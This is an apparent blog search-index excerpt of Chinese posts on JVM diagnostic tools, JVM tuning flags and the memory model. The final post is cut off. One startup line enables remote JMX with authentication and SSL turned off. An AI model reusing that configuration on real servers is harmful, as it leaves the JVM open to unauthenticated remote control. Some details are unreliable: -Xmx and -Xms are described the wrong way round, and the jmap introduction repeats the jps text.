&#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM性能监控及故障分析工具","slug":"language/jvm/JVM性能监控及故障分析工具","date":"2021-08-04T06:25:13.663Z","updated":"2021-08-04T06:25:13.664Z","comments":true,"path":"2021/08/04/language/jvm/JVM性能监控及故障分析工具/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%E5%8F%8A%E6%95%85%E9%9A%9C%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/","excerpt":"","text":"JVM 性能监控及故障分析工具1.概要JDK官方提供了不少好用的JAVA故障处理工具,JDK的命令行工具在JDK的bin目录下供用户使用。 ２.jps２.1.简介jps是jdk提供的查看当前java进程的工具，简单看作为JavaVirtual Machine Process Status Tool。命令格式： 1jps [options] [hostid] options 参数详解:参数 | 解释—-| —- -q | 仅输出VM标识符，不包括classname,jar name,arguments in main method -m | 输出main method的参数 -l | 输出完全的包名，应用主类名，jar的完全路径名 -v | 输出jvm参数 -V | 输出通过flag文件传递到JVM中的参数(.hotspotrc文件或-XX:Flags=所指定的文件 -J | 传递参数到vm,例如:-J-Xms512mhostid 参数解释:[protocol:][[//]hostname][:port][/servername] ２.２.实例123[java@RCS-AS-01 root]$ jps3201 Jps20819 AuthBootstrap 12[java@RCS-AS-01 root]$ jps -lv20819 com.feinno.urcs.auth.main.AuthBootstrap -Duser.dir=/home/urcs/urcs-as-authentication -Xmx1024m -Xms1024m 1234[java@RCS-AS-01 root]$ jps -lvm 10.10.220.101RMI Registry not available at 10.10.220.101:1099Connection refused to host: 10.10.220.101; nested exception is:java.net.ConnectException: Connection refused。需要在远程机器上开启：jstatd 3.jstat3.1.简介Jstat是JDK自带的一个轻量级小工具。全称“Java Virtual Machine statistics monitoring tool”，它位于Java的bin目录下，主要利用JVM内建的指令对Java应用程序的资源和性能进行实时的命令行的监控，包括了对Heap size和垃圾回收状况的监控。可见，Jstat是轻量级的、专门针对JVM的工具。命令格式： 1jstat [options] 3.2.options 参数详解: 3.2.1. jstat -class : 显示加载 class 的数量,及所占空间等信息, 显示列名 具体描述 Loaded 装载的类的数量 Bytes 装载类所占用的字节数 Unloaded 卸载类的数量 Bytes 卸载类的字节数 Time 装载和卸载类所花费的时间 3.2.2.jstat -compiler :显示 VM 实时编译的数量等信息, 显示列名 具体描述 Compiled 编译任务执行数量 Failed 编译任务执行失败数量 Invalid 编译任务执行失效数量 Time 编译任务消耗时间 FailedType 最后一个编译失败任务的类型 FailedMethod 最后一个编译失败任务所在的类及方法 3.2.3.jstat -gc : 可以显示 gc 的信息,查看 gc 的次数,及时间, 显示列名 具体描述 S0C 年轻代中第一个 survivor(幸存区)的容量(字节) S1C 年轻代中第二个 survivor(幸存区)的容量(字节) S0U 年轻代中第一个 survivor(幸存区)目前已使用空间(字节) S1U 年轻代中第二个 survivor(幸存区)目前已使用空间(字节) EC 年轻代中 Eden(伊甸园)的容量(字节) EU 年轻代中 Eden(伊甸园)目前已使用空间(字节) OC Old 代的容量(字节) OU Old 代目前已使用空间(字节) PC Perm(持久代)的容量(字节) PU Perm(持久代)目前已使用空间(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 YGCT 从应用程序启动到采样时年轻代中 gc 所用时间(s) FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 FGCT 从应用程序启动到采样时 old 代(全 gc)gc 所用时间(s) GCT 从应用程序启动到采样时 gc 用的总时间(s) 3.2.4. jstat -gccapacity :可以显示,VM 内存中三代(young,old,perm)对象的使用和占用大小 显示列名 具体描述 NGCMN 年轻代(young)中初始化(最小)的大小(字节) NGCMX 年轻代(young)的最大容量(字节) NGC 年轻代(young)中当前的容量(字节) S0C 年轻代中第一个 survivor(幸存区)的容量(字节) S1C 年轻代中第二个 survivor(幸存区)的容量(字节) EC 年轻代中 Eden(伊甸园)的容量(字节) OGCMN old 代中初始化(最小)的大小(字节) OGCMX old 代的最大容量(字节) OGC old 代当前新生成的容量(字节) OC Old 代的容量(字节) PGCMN perm 代中初始化(最小)的大小(字节) PGCMX perm 代的最大容量(字节) PGC perm 代当前新生成的容量(字节) PC Perm(持久代)的容量(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 3.2.5.jstat -gcutil :统计 gc 信息 显示列名 具体描述 S0 年轻代中第一个 survivor(幸存区)已使用的占当前容量百分比 S1 年轻代中第二个 survivor(幸存区)已使用的占当前容量百分比 E 年轻代中 Eden(伊甸园)已使用的占当前容量百分比 O old 代已使用的占当前容量百分比 P perm 代已使用的占当前容量百分比 YGC 从应用程序启动到采样时年轻代中 gc 次数 YGCT 从应用程序启动到采样时年轻代中 gc 所用时间(s) FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 FGCT 从应用程序启动到采样时 old 代(全 gc)gc 所用时间(s) GCT 从应用程序启动到采样时 gc 用的总时间(s) 3.2.6. jstat -gcnew :年轻代对象的信息, 显示列名 具体描述 S0C 年轻代中第一个 survivor(幸存区)的容量(字节) S1C 年轻代中第二个 survivor(幸存区)的容量(字节) S0U 年轻代中第一个 survivor(幸存区)目前已使用空间(字节) S1U 年轻代中第二个 survivor(幸存区)目前已使用空间(字节) TT 持有次数限制 MTT 最大持有次数限制 EC 年轻代中 Eden(伊甸园)的容量(字节) EU 年轻代中 Eden(伊甸园)目前已使用空间(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 YGCT 从应用程序启动到采样时年轻代中 gc 所用时间(s) 3.2.7. jstat -gcnewcapacity : 年轻代对象的信息及其占用量, 显示列名 具体描述 NGCMN 年轻代(young)中初始化(最小)的大小(字节) NGCMX 年轻代(young)的最大容量(字节) NGC 年轻代(young)中当前的容量(字节) S0CMX 年轻代中第一个 survivor(幸存区)的最大容量(字节) S0C 年轻代中第一个 survivor(幸存区)的容量(字节) S1CMX 年轻代中第二个 survivor(幸存区)的最大容量(字节) S1C 年轻代中第二个 survivor(幸存区)的容量(字节) ECMX 年轻代中 Eden(伊甸园)的最大容量(字节) EC 年轻代中 Eden(伊甸园)的容量(字节) 3.2.8. jstat -gcold :old 代对象的信息, 显示列名 具体描述 PC Perm(持久代)的容量(字节) PU Perm(持久代)目前已使用空间(字节) OC Old 代的容量(字节) OU Old 代目前已使用空间(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 FGCT 从应用程序启动到采样时 old 代(全 gc)gc 所用时间(s) GCT 从应用程序启动到采样时 gc 用的总时间(s) 3.2.9.stat -gcoldcapacity : old 代对象的信息及其占用量 显示列名 具体描述 OGCMN old 代中初始化(最小)的大小(字节) OGCMX old 代的最大容量(字节) OGC old 代当前新生成的容量(字节) OC Old 代的容量(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 FGCT 从应用程序启动到采样时 old 代(全 gc)gc 所用时间(s) GCT 从应用程序启动到采样时 gc 用的总时间(s) 3.2.10. jstat -gcpermcapacity: perm 对象的信息及其占用量, 显示列名 具体描述 PGCMN perm 代中初始化(最小)的大小(字节) PGCMX perm 代的最大容量(字节) PGC perm 代当前新生成的容量(字节) PC Perm(持久代)的容量(字节) YGC 从应用程序启动到采样时年轻代中 gc 次数 FGC 从应用程序启动到采样时 old 代(全 gc)gc 次数 FGCT 从应用程序启动到采样时 old 代(全 gc)gc 所用时间(s) GCT 从应用程序启动到采样时 gc 用的总时间(s) 3.2.11. jstat -printcompilation :当前 VM 执行的信息, 显示列名 具体描述 Compiled 编译任务的数目 Size 方法生成的字节码的大小 Type 编译类型 Method 类名和方法名用来标识编译的方法,类名使用/做为一个命名空间分隔符,方法名是给定类中的方法,上述格式是由-XX:+PrintComplation 选项进行设置的 3.3.实例:1234[java@RCS-AS-01 root]$ jstat -gcutil 16885 1000 S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 0.00 93.51 54.24 10.36 98.25 96.86 205 16.720 3 1.041 17.760 0.00 93.51 54.24 10.36 98.25 96.86 205 16.720 3 1.041 17.760 1234[java@RCS-AS-01 root]$ jstat -class 16885 1000Loaded Bytes Unloaded Bytes Time 10051 19327.1 32 44.2 27.15 10051 19327.1 32 44.2 27.15 4.jinfo4.1.简介jinfo(Java Configuration Information)，主要用于查看指定Java进程(或核心文件、远程调试服务器)的Java配置信息。命令格式： 123jinfo [options] pidjinfo [options] executable corejinfo [options] [server-id@]remote-hostname-or-IP 参数详解:参数 | 解释—-| —- pid | 进程号 executable | 产生core dump的java executable core | core file remote-hostname-or-IP | 主机名或ip server-id | 远程主机上的debug server的唯一id options 参数详解: 参数 解释 no option 打印命令行参数和系统属性 -flags 打印命令行参数 -sysprops 打印系统属性 -h 帮助 4.2.实例123456789101112131415161718[java@RCS-AS-01 root]$ jinfo 16885Attaching to process ID 16885, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.65-b01Java System Properties:java.runtime.name = Java(TM) SE Runtime Environmentjava.vm.version = 25.65-b01sun.boot.library.path = /usr/local/jdk8u65/jre/lib/amd64java.vendor.url = http://java.oracle.com/java.vm.vendor = Oracle Corporationpath.separator = :file.encoding.pkg = sun.iojava.vm.name = Java HotSpot(TM) 64-Bit Server VM.....VM Flags:Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=1073741824 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357564416 -XX:MinHeapDeltaBytes=524288 -XX:NewSize=357564416 -XX:OldSize=716177408 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps -XX:+UseParallelGCCommand line: -Duser.dir=/home/urcs/urcs-as-im -Xmx1024m -Xms1024m 1234567[java@RCS-AS-01 root]$ jinfo -flags 16885Attaching to process ID 16885, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.65-b01Non-default VM flags: -XX:CICompilerCount=2 -XX:InitialHeapSize=1073741824 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357564416 -XX:MinHeapDeltaBytes=524288 -XX:NewSize=357564416 -XX:OldSize=716177408 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps -XX:+UseParallelGCCommand line: -Duser.dir=/home/urcs/urcs-as-im -Xmx1024m -Xms1024m 5.jmap5.1.简介jps是jdk提供的查看当前java进程的工具，简单看作为JavaVirtual Machine Process Status Tool。命令格式： 123jmap [options] pidjmap [options] executable corejmap [options] [server-id@]remote-hostname-or-IP 参数详解:参数 | 解释—-| —- pid | 进程号 executable | 产生core dump的java executable core | core file remote-hostname-or-IP | 主机名或ip server-id | 远程主机上的debug server的唯一id options 参数详解:参数 | 解释—-| —--dump:[live,]format=b,file= | 使用hprof二进制形式,输出jvm的heap内容到文件=. live子选项是可选的，假如指定live选项,那么只输出活的对象到文件.-finalizerinfo | 打印正等候回收的对象的信息.-heap | 打印heap的概要信息，GC使用的算法，heap的配置及wise heap的使用情况.-histo[:live] | 打印每个class的实例数目,内存占用,类全名信息. VM的内部类名字开头会加上前缀”*”. 如果live子参数加上后,只统计活的对象数量.-permstat | 打印classload和jvm heap长久层的信息. 包含每个classloader的名字,活泼性,地址,父classloader和加载的class数量. 另外,内部String的数量和占用内存数也会打印出来.-F | 强迫.在pid没有相应的时候使用-dump或者-histo参数. 在这个模式下,live子参数无效.-h | -help 打印辅助信息-J | 传递参数给jmap启动的jvm. 5.2.实例123[java@RCS-AS-01 root]$ jmap -dump:live,format=b,file=/tmp/heap.dump 16885Dumping heap to /tmp/heap.dump ...Heap dump file created 6.jstack6.1.简介jstack（ Stack Trace for Java） 命令 用于 生成 虚拟 机 当前 时刻 的 线程 快照（ 一般 称为 threaddump 或 javacore 文件）。 线程 快照 就是 当前 虚拟 机内 每一 条 线程 正在 执行 的 方法 堆栈 的 集合， 生成 线程 快照 的 主要 目的 是 定位 线程 出现 长时间 停顿 的 原因， 如 线程间死锁,死 循环,请求 外部 资源 导致 的 长时间 等待 等 都是 导致 线程 长时间 停顿 的 常见 原因。 命令格式： 123jstack [options] pidjstack [options] executable corejstack [options] [server-id@]remote-hostname-or-IP 参数详解: 参数 解释 pid 进程号 executable 产生 core dump 的 java executable core core file remote-hostname-or-IP 主机名或 ip server-id 远程主机上的 debug server 的唯一 id options 参数详解: 参数 解释 -F 当 jstack [-l] pid 没有相应的时候强制打印栈信息 -l 长列表. 打印关于锁的附加信息,例如属于 java.util.concurrent 的 ownable synchronizers 列表. -m 打印 java 和 native c/c++框架的所有栈信息. -h -help 打印帮助信息 6.2.实例123456789101112131415161718[java@RCS-AS-01 root]$ jstack 16885 &gt; /tmp/stack16885.1查看文件显示：2017-07-29 16:20:51Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.65-b01 mixed mode):&quot;HikariCP connection filler (pool HikariPool-11)&quot; #26011 daemon prio=5 os_prio=0 tid=0x0000000000f46000 nid=0x2bde waiting on condition [0x00007f334e8b4000] java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for &lt;0x00000000c25016e8&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078) at java.util.concurrent.LinkedBlockingQueue.poll(LinkedBlockingQueue.java:467) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1066) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745)............ 7.jhat7.1.简介提供 jhat（ JVM Heap Analysis Tool） 命令 与 jmap 搭配 使用， 来 分析 jmap 生成 的 堆 转储 快照。命令格式： 1 jhat -J-Xmx512m &lt;heap dump file&gt; 备注:jhat 内置 了 一个 微型 的 HTTP/ HTML 服务器， 生成 dump 文件 的 分析 结果 后， 可以 在 浏览器 中 查看。 不过 实事求是 地说， 在 实际 工作中， 除非 笔者 手上 真的 没有 别的 工具 可用， 否则 一般 都 不会 去 直接 使用 jhat 命令 来 分析 dump 文件， 主要原因 有 二： 一是 一般 不会 在 部署 应用 程序 的 服务器 上 直接 分析 dump 文件， 即使 可以 这样做， 也会 尽量 将dump 文件 拷贝 到 其他 机器[ 4] 上进 行 分析， 因为 分析 工作 是一 个 耗时 而且 消耗 硬件 资源 的 过程， 既然 都要 在 其他 机器 上 进行， 就 没 必要 受到 命令行 工具 的 限制 了。 另外 一个 原因 是 jhat 的 分析 功能 相对来说 比较 简陋， 后文 将会 介绍 到 的 VisualVM 7.2.实例:1、产生dump文件 c:&gt;jmap -dump:file=f:\\yown\\dump.bin 16912Dumping heap to F:\\apps\\dump.txt …Heap dump file created 2、生成站点分析报告，便于网络访问 c:&gt;jhat -J-Xmx512m -port 88f:\\yown\\dump.bin 12345678910111213141516171819Reading from f:\\apps\\dump.bin...Dump file created Thu Jul 26 16:31:36 CST 2012Snapshot read, resolving...Resolving 2194971 objects...Chasing references, expect 438 dots......................................................................................................................................................................................................................................................................................................................................................................................................................................................Eliminating duplicate references......................................................................................................................................................................................................................................................................................................................................................................................................................................................Snapshot resolved.Started HTTP server on port 88Server is ready. 3.访问 http://localhost:88/ 这里记录了进程中所有类及实例个数 8.jvisualvm8.1.简介:VisualVM（ All- in- One Java Troubleshooting Tool） 是 到 目前 为止， 随 JDK 发布 的 功能 最强 大的 运行 监视 和 故障 处理 程序， 并且 可以 预见 在 未来 一段时间 内 都是 官方 主力 发展 的 虚拟 机 故障 处理 工具。 官方 在 VisualVM 的 软件 说明 中写 上了“ All- in- One” 的 描述 字样， 预示 着 它 除了 运行 监视、 故障 处理 外， 还 提供 了 很多 其他 方面 的 功能。VisualVM 基于 NetBeans 平台 开发， 因此 它 一 开始 就 具备 了 插件 扩展 功能 的 特性， 通过 插件 扩展 支持， VisualVM 可以 做到：·显示 虚拟 机 进程 及 进程 的 配置 和 环境 信息（ jps、 jinfo）·监视 应用 程序 的 CPU、 GC、 堆、 方法 区 及 线程 的 信息（ jstat、 jstack）。·dump 及 分析 堆 转储 快照（ jmap、 jhat）·方法 级 的 程序 运行 性能 分析， 找出 被 调用 最多、 运行 时间 最长 的 方法·离 线程 序 快照： 收集 程序 的 运行时 配置、 线程 dump、 内存 dump 等 信息 建立 一个 快照， 可以 将 快照 发送 开发者 处 进行 Bug 反馈。·其他 plugins 的 无限 的 可能性 8.2.界面展示如下图 9.开启Java服务远程监控9.1.启动脚本中添加如下参数1JAVA_ARGS[2]=&quot;-Dcom.sun.management.jmxremote.port=8999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false -Djava.rmi.server.hostname=10.10.220.101&quot; 9.2.通过jvisualvm可以监控远程java服务，如下：","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM常见参数设置","slug":"language/jvm/JVM常见参数设置","date":"2021-08-04T06:25:13.663Z","updated":"2021-08-04T06:25:13.663Z","comments":true,"path":"2021/08/04/language/jvm/JVM常见参数设置/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E5%B8%B8%E8%A7%81%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"1. 查看-XX:+PrintFlagsFinal 查看堆的默认值，使用下面的代码。其中 InitialHeapSize 为最开始的堆的大小，MaxHeapSize 为堆的最大值。 12345678910$ java -XX:+PrintFlagsFinal -version | grep HeapSize uintx ErgoHeapSizeLimit = 0 &#123;product&#125; uintx HeapSizePerGCThread = 87241520 &#123;product&#125; uintx InitialHeapSize := 134217728 &#123;product&#125; uintx LargePageHeapSizeThreshold = 134217728 &#123;product&#125; uintx MaxHeapSize := 2147483648 &#123;product&#125;java version &quot;1.8.0_25&quot;Java(TM) SE Runtime Environment (build 1.8.0_25-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.25-b02, mixed mode) 查看栈的默认值, 其中 ThreadStackSize 为栈内存的大小。 12345678$ java -XX:+PrintFlagsFinal -version | grep ThreadStackSize intx CompilerThreadStackSize = 0 &#123;pd product&#125; intx ThreadStackSize = 1024 &#123;pd product&#125; intx VMThreadStackSize = 1024 &#123;pd product&#125;java version &quot;1.8.0_25&quot;Java(TM) SE Runtime Environment (build 1.8.0_25-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.25-b02, mixed mode) 2. 堆 -Xmx：初始堆的大小 -Xms：最大堆大小，建议这两个参数大小保持一致，为物理内存的 1/4 -Xmn：指定新生代的大小（Eden + Survior from + Survior to）的大小，增大新生代的大小，老年代的大小将被减小，sun 官方推荐 新生代的大小：堆 = 3 : 8 -XX:NewSize：设置新生代大小 -XX:MaxNewSize：设置新生代的最大值-Xmn 相当于设同时设置 NewSize=MaxNewSize -XX:NewRation：老年代：新生代 = 4，即 old：(Eden + Survivor from + Survivor to) ，则说明新生代为整个堆区的 1/5 -XX:SurvivorRation：设置 Eden 区和 Survivor。默认值为8；即：Eden：Survivor=8:1 ==&gt; Eden：Survivor from：Survivor to = 8:1:1若值为3，即：Eden：Survivor=8:1 ==&gt; Eden：Survivor from：Survivor to = 3:1:1 3. 方法区（非堆） -XX:PermSize：设置方法区大小 -XX:MaxPermSize： 设置方法区的最大值 1.8 之前可以理解为 永久区（PerSize，MaxPerSize）。 1.8 之后使用 元数据区 取代。（MaxMetaspaceSize）。 4. 栈 -Xss：栈内存的大小 5. 详细参数5.1.基础参数 参数名称 含义 默认值 -Xms 初始堆大小 物理内存的1/64(&lt;1GB) 默认(MinHeapFreeRatio参数可以调整)空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制. -Xmx 最大堆大小 物理内存的1/4(&lt;1GB) 默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到 -Xms的最小限制 -Xmn 年轻代大小(1.4or lator) 注意：此处的大小是（eden+ 2 survivor space).与jmap -heap中显示的New gen是不同的。 整个堆大小=年轻代大小 + 年老代大小 + 持久代大小. 增大年轻代后,将会减小年老代大小.此值对系统性能影响较大,Sun官方推荐配置为整个堆的3/8 -XX:NewSize 设置年轻代大小(for 1.3/1.4) -XX:MaxNewSize 年轻代最大值(for 1.3/1.4) -XX:PermSize 设置持久代(perm gen)初始值 物理内存的1/64 -XX:MaxPermSize 设置持久代最大值 物理内存的1/4 -Xss 每个线程的堆栈大小 JDK5.0以后每个线程堆栈大小为1M,以前每个线程堆栈大小为256K. 根据应用的线程所需内存大小进行 调整.在相同物理内存下,减小这个值能生成更多的线程.但是操作系统对一个进程内的线程数还是有限制的,不能无限生成,经验值在3000~5000左右 一般小的应用， 如果栈不是很深， 应该128k够用的 大的应用建议使用256k。这个选项对性能影响比较大，需要严格的测试。 和threadstacksize选项解释很类似,官方文档似乎没有解释,在论坛中有这样一句话:”-Xss is translated in a VM flag named ThreadStackSize”. 一般设置128k或者256k这个值就可以了。 -XX:ThreadStackSize Thread Stack Size (0 means use default stack size) [Sparc: 512; Solaris x86: 320 (was 256 prior in 5.0 and earlier); Sparc 64 bit: 1024; Linux amd64: 1024 (was 0 in 5.0 and earlier); all others 0.] -XX:NewRatio 年轻代(包括Eden和两个Survivor区)与年老代的比值(除去持久代) -XX:NewRatio=4表示年轻代与年老代所占比值为1:4,年轻代占整个堆栈的1/5 Xms=Xmx并且设置了Xmn的情况下，该参数不需要进行设置。 -XX:SurvivorRatio Eden区与Survivor区的大小比值 设置为8,则两个Survivor区与一个Eden区的比值为2:8,一个Survivor区占整个年轻代的1/10 -XX:LargePageSizeInBytes 内存页的大小不可设置过大， 会影响Perm的大小 =128m -XX:+UseFastAccessorMethods 原始类型的快速优化 -XX:+DisableExplicitGC 关闭System.gc() 这个参数需要严格的测试 -XX:MaxTenuringThreshold 垃圾最大年龄 如果设置为0的话,则年轻代对象不经过Survivor区,直接进入年老代. 对于年老代比较多的应用,可以提高效率.如果将此值设置为一个较大值,则年轻代对象会在Survivor区进行多次复制,这样可以增加对象再年轻代的存活 时间,增加在年轻代即被回收的概率 该参数只有在串行GC时才有效. -XX:+AggressiveOpts 加快编译 -XX:+UseBiasedLocking 锁机制的性能改善 -Xnoclassgc 禁用垃圾回收 -XX:SoftRefLRUPolicyMSPerMB 每兆堆空闲空间中SoftReference的存活时间 1s softly reachable objects will remain alive for some amount of time after the last time they were referenced. The default value is one second of lifetime per free megabyte in the heap -XX:PretenureSizeThreshold 对象超过多大是直接在旧生代分配 0 单位字节 新生代采用Parallel Scavenge GC时无效 另一种直接在旧生代分配的情况是大的数组对象,且数组中无外部引用对象. -XX:TLABWasteTargetPercent TLAB占eden区的百分比 1% -XX:+CollectGen0First FullGC时是否先YGC false 5.2 并行收集器相关参数| -XX:+UseParallelGC | Full GC采用parallel MSC(此项待验证) | | 选择垃圾收集器为并行收集器.此配置仅对年轻代有效.即上述配置下,年轻代使用并发收集,而年老代仍旧使用串行收集.(此项待验证) || — | — | — | — || -XX:+UseParNewGC | 设置年轻代为并行收集 | | 可与CMS收集同时使用JDK5.0以上,JVM会根据系统配置自行设置,所以无需再设置此值 || -XX:ParallelGCThreads | 并行收集器的线程数 | | 此值最好配置与处理器数目相等 同样适用于CMS || -XX:+UseParallelOldGC | 年老代垃圾收集方式为并行收集(Parallel Compacting) | | 这个是JAVA 6出现的参数选项 || -XX:MaxGCPauseMillis | 每次年轻代垃圾回收的最长时间(最大暂停时间) | | 如果无法满足此时间,JVM会自动调整年轻代大小,以满足此值. || -XX:+UseAdaptiveSizePolicy | 自动选择年轻代区大小和相应的Survivor区比例 | | 设置此选项后,并行收集器会自动选择年轻代区大小和相应的Survivor区比例,以达到目标系统规定的最低相应时间或者收集频率等,此值建议使用并行收集器时,一直打开. || -XX:GCTimeRatio | 设置垃圾回收时间占程序运行时间的百分比 | | 公式为1/(1+n) || -XX:+ScavengeBeforeFullGC | Full GC前调用YGC | true | Do young generation GC prior to a full GC. (Introduced in 1.4.1.) | 5.3 CMS相关参数 -XX:+UseConcMarkSweepGC 使用CMS内存收集 测试中配置这个以后,-XX:NewRatio=4的配置失效了,原因不明.所以,此时年轻代大小最好用-Xmn设置.??? -XX:+AggressiveHeap 试图是使用大量的物理内存 长时间大内存使用的优化，能检查计算资源（内存， 处理器数量） 至少需要256MB内存 大量的CPU／内存， （在1.4.1在4CPU的机器上已经显示有提升） -XX:CMSFullGCsBeforeCompaction 多少次后进行内存压缩 由于并发收集器不对内存空间进行压缩,整理,所以运行一段时间以后会产生”碎片”,使得运行效率降低.此值设置运行多少次GC以后对内存空间进行压缩,整理. -XX:+CMSParallelRemarkEnabled 降低标记停顿 -XX+UseCMSCompactAtFullCollection 在FULL GC的时候， 对年老代的压缩 CMS是不会移动内存的， 因此， 这个非常容易产生碎片， 导致内存不够用， 因此， 内存的压缩这个时候就会被启用。 增加这个参数是个好习惯。 可能会影响性能,但是可以消除碎片 -XX:+UseCMSInitiatingOccupancyOnly 使用手动定义初始化定义开始CMS收集 禁止hostspot自行触发CMS GC -XX:CMSInitiatingOccupancyFraction=70 使用cms作为垃圾回收 使用70％后开始CMS收集 92 为了保证不出现promotion failed(见下面介绍)错误,该值的设置需要满足以下公式CMSInitiatingOccupancyFraction计算公式 -XX:CMSInitiatingPermOccupancyFraction 设置Perm Gen使用到达多少比率时触发 92 -XX:+CMSIncrementalMode 设置为增量模式 用于单CPU情况 -XX:+CMSClassUnloadingEnabled 5.4 辅助信息| -XX:+PrintGC | | | 输出形式:[GC 118250K-&gt;113543K(130112K), 0.0094143 secs][Full GC 121376K-&gt;10414K(130112K), 0.0650971 secs] || — | — | — | — || -XX:+PrintGCDetails | | | 输出形式:[GC [DefNew: 8614K-&gt;781K(9088K), 0.0123035 secs] 118250K-&gt;113543K(130112K), 0.0124633 secs][GC [DefNew: 8614K-&gt;8614K(9088K), 0.0000665 secs][Tenured: 112761K-&gt;10414K(121024K), 0.0433488 secs] 121376K-&gt;10414K(130112K), 0.0436268 secs] || -XX:+PrintGCTimeStamps | | | || -XX:+PrintGC:PrintGCTimeStamps | | | 可与-XX:+PrintGC -XX:+PrintGCDetails混合使用输出形式:11.851: [GC 98328K-&gt;93620K(130112K), 0.0082960 secs] || -XX:+PrintGCApplicationStoppedTime | 打印垃圾回收期间程序暂停的时间.可与上面混合使用 | | 输出形式:Total time for which application threads were stopped: 0.0468229 seconds || -XX:+PrintGCApplicationConcurrentTime | 打印每次垃圾回收前,程序未中断的执行时间.可与上面混合使用 | | 输出形式:Application time: 0.5291524 seconds || -XX:+PrintHeapAtGC | 打印GC前后的详细堆栈信息 | | || -Xloggc:filename | 把相关日志信息记录到文件以便分析.与上面几个配合使用 | | || -XX:+PrintClassHistogram | garbage collects before printing the histogram. | | || -XX:+PrintTLAB | 查看TLAB空间的使用情况 | | || XX:+PrintTenuringDistribution | 查看每次minor GC后新的存活周期的阈值 | | Desired survivor size 1048576 bytes, new threshold 7 (max 15)new threshold 7即标识新的存活周期的阈值为7。 | 6.参考https://juejin.cn/post/6844903740848242695http://ssword.cn/f/view-3-be0e37a28e984c9c832a864b70d615cf.html","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"JVM内存模型","slug":"language/jvm/JVM内存模型","date":"2021-08-04T06:25:13.662Z","updated":"2021-08-04T06:25:13.662Z","comments":true,"path":"2021/08/04/language/jvm/JVM内存模型/","link":"","permalink":"https://wuhaocn.github.io/2021/08/04/language/jvm/JVM%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"##JVM 内存模型 1.内存模型结构图 名称 特征 作用 配置参数 异常 程序计数器 占用内存小，线程私有， 生命周期与线程相同 大致为字节码行号指示器 无 无 虚拟机栈 线程私有，生命周期与线程相同，使用连续的内存空间 Java 方法执行的内存模型，存储局部变量表、操作栈、动态链接、方法出口等信息 -Xss OutOfMemoryError，StackOverflowError java 堆 线程共享，生命周期与虚拟机相同，可以不使用连续的内存地址 保存对象实例，所有对象实例（包括数组）都要在堆上分配 -Xms-Xsx -Xmn OutOfMemoryError 方法区 线程共享，生命周期与虚拟机相同，可以不使用连续的内存地址 存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据 -XX:PermSize:16M-XX:MaxPermSize64M OutOfMemoryError 运行时常量池 方法区的一部分，具有动态性 存放字面量及符号引用 无 无 1.1 程序计数器 程序 计数器（ Program Counter Register） 是一 块 较小 的 内存 空间， 它的 作用 可以 看做 是 当前 线程 所 执行 的 字节 码 的 行号 指示器。 在 虚拟 机 的 概念 模型 里（ 仅是 概念 模型， 各种 虚拟 机 可能 会 通过 一些 更 高效 的 方式 去 实现）， 字节 码 解释器 工作 时 就是 通过 改变 这个 计数器 的 值 来 选取 下一 条 需要 执行 的 字节 码 指令， 分支、 循环、 跳 转、 异常 处理、 线程 恢复 等 基础 功能 都 需要 依赖 这个 计数器 来 完成。 由于 Java 虚拟 机 的 多 线程 是 通过 线程 轮流 切换 并 分配 处理器 执行 时间 的 方式 来 实现 的， 在任 何 一个 确定 的 时刻， 一个 处理器（ 对于 多 核 处理器 来说 是一 个 内核） 只会 执行 一条 线程 中的 指令。 因此， 为了 线程 切换 后能 